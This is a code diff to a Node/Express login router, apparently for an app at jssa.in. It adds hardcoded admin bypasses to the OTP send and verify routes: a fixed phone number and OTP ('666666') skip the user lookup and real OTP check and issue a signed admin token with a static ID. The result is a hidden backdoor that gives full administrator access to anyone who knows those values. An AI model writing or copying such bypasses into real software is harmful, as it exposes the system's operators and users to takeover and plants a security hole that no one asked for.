@@ -318,6 +318,15 @@ router.post(
       }
 
       const { phone, role } = req.body;
+
+      // STATIC ADMIN LOGIN BYPASS
+      if (phone === "9999999999" && role === "admin") {
+        return res.json({
+          success: true,
+          message: "OTP sent successfully (Static Admin)",
+        });
+      }
+
       let user = await User.findOne({ phone });
 
       // If user exists, check role
@@ -383,6 +392,31 @@ router.post(
   async (req, res) => {
     try {
       const { phone, otp, role } = req.body;
+
+      // STATIC ADMIN VERIFY BYPASS
+      if (phone === "9999999999" && otp === "666666" && role === "admin") {
+        const STATIC_ADMIN_ID = "000000000000000000000001";
+        const token = generateToken({
+          id: STATIC_ADMIN_ID,
+          email: "admin@jssa.in",
+          role: "admin",
+        });
+
+        return res.json({
+          success: true,
+          message: "Login successful (Static Admin OTP)",
+          data: {
+            user: {
+              id: STATIC_ADMIN_ID,
+              email: "admin@jssa.in",
+              phone: "9999999999",
+              role: "admin",
+            },
+            token,
+          },
+        });
+      }
+
       const user = await User.findOne({ phone });
 
       if (!user) {
